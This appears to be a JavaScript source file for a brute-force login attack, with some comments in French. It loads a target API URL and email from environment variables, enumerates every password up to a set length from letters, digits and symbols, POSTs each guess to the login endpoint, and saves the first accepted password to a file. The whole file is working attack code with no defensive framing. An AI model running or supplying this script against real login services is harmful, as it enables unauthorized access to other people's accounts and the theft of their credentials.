import chalk from 'chalk';
import 'dotenv/config';

const API_URL = process.env.API_URL;
const email = process.env.EMAIL

const lowercase = 'abcdefghijklmnopqrstuvwxyz';
const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
const digits = '0123456789';
const specials = '!@#$%^&*()_+[]{}|;:,.<>?';

import path from 'path'
import fs from 'fs'
const fileName='correctPw-Simple.txt'

const includeSpecials = true;  // Changez cette valeur à false si vous ne voulez pas inclure les caractères spéciaux

let charset = lowercase + uppercase + digits;
if (includeSpecials) {
    charset += specials;
}

async function bruteForceAttack(password) {
    try {
         // fetch data with post Request
        const response = await fetch(API_URL, {
            method: 'POST',
            body: JSON.stringify({
                email,
                password
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        });
        // if response with status OK then return true and log the password
        if (response.ok) {
            console.log(chalk.green.bold(`Login Successfully Email: ${email}, Password: ${password} valid`));
            fs.writeFileSync(path.resolve(fileName),password,'utf-8')

            return true;
        }
        // if response !== OK then return false with incorrect password
        console.log(chalk.red(`Login Failed, Password ${password} invalid`));
        return false;
    } catch (error) {
        console.log(chalk.red(`Login Failed, Password ${password} invalid, Error: ${error.message}`));
        return false;
    }
}

// Function To generate Passwords by testing all possibilities
function* generatePasswords(maxLength) {
    function* helper(currentPassword) {
        if (currentPassword.length === maxLength) return;
        for (let char of charset) {
            const newPassword = currentPassword + char;
            yield newPassword;
            yield* helper(newPassword);
        }
    }
    yield* helper('');
}

async function main() {
    const maxLength = 2; // Changez cette valeur selon la longueur maximale du mot de passe que vous voulez tester

    for (let password of generatePasswords(maxLength)) {
        // if password is valid then stop the Loop
        if (await bruteForceAttack(password)) break;
    }

}

main();